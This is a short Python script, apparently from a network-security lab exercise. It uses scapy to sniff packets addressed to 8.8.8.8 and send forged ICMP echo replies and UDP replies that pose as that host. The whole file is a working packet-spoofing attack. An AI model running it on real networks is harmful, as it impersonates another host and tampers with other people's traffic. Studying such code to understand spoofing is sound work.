import scapy.all as scapy


def spoof_icmp(source_ip, dst_ip):
    ip_hdr = scapy.IP(src=source_ip, dst=dst_ip)
    icmp_hdr = scapy.ICMP(type=0)

    pkt = ip_hdr / icmp_hdr

    return pkt


def spoof_udp(source_ip, dst_ip, s_port, d_port):
    ip_hdr = scapy.IP(src=source_ip, dst=dst_ip)
    udp_hdr = scapy.UDP(sport=s_port, dport=d_port)
    raw_hdr = scapy.Raw(b"Response!!")

    pkt = ip_hdr / udp_hdr / raw_hdr

    return pkt


def sniff(packet):

    if packet.haslayer(scapy.IP) and packet.haslayer(scapy.ICMP):
        scapy.send(spoof_icmp(packet[scapy.IP].dst, packet[scapy.IP].src), verbose=False)

    elif packet.haslayer(scapy.IP) and packet.haslayer(scapy.UDP):

        scapy.send(spoof_udp(packet[scapy.IP].dst,
                             packet[scapy.IP].src,
                             packet[scapy.UDP].dport,
                             packet[scapy.UDP].sport), verbose=False)


def main():
    scapy.sniff(prn=sniff, filter="dst 8.8.8.8")


if __name__ == "__main__":
    main()
